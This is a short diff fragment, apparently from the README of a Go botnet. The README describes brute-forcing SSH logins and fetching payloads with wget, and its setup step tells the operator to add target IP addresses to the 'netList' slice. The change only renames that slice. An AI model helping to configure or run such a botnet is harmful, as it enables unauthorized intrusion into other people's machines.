@@ -44,7 +44,7 @@ and login by Brute-force attack. This botnet will use "wget" to get payload from
 	#So... That's mean you don't need to add a case of your ip range.
 	
 
-(3) Then go to The "SSH_Conn" function and add your ip constant to The slice name "NetList".
+(3) Then go to The "SSH_Conn" function and add your ip constant to The slice name "netList".
 
 		netList := []string{
 			ip1, ip2, ip3, ip4, ip5, ip6, ip7, ip8,
